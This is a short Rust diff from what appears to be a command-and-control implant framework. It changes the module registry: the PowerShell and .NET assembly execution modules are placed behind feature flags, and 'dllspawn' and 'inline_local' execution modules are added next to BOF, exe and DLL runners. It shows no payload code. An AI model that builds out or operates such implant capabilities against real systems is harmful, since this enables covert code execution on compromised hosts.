@@ -212,8 +212,14 @@ pub extern "C" fn register_modules() -> HashMap<String, Box<MaleficModule>> {
         register_module!(map, "pipe", fs::pipe::PipeUpload);
         
         register_module!(map, "execute_bof", execute::execute_bof::ExecuteBof);
-        register_module!(map, "execute_assembly",execute::execute_assemble::ExecuteAssembly);
+        #[cfg(feature = "execute_powershell")]
         register_module!(map, "execute_powershell",execute::execute_powershell::ExecutePowershell);
+        
+        #[cfg(feature = "execute_assembly")]
+        register_module!(map, "execute_assembly",execute::execute_assembly::ExecuteAssembly);
+        
+        register_module!(map, "dllspawn",execute::dllspawn::ExecuteDllSpawn);
+        register_module!(map, "inline_local",execute::inline_local::InlineLocal);
         register_module!(map, "execute_armory",execute::execute_armory::ExecuteArmory);
         register_module!(map, "execute_exe", execute::execute_exe::ExecuteExe);
         register_module!(map, "execute_dll", execute::execute_dll::ExecuteDll);
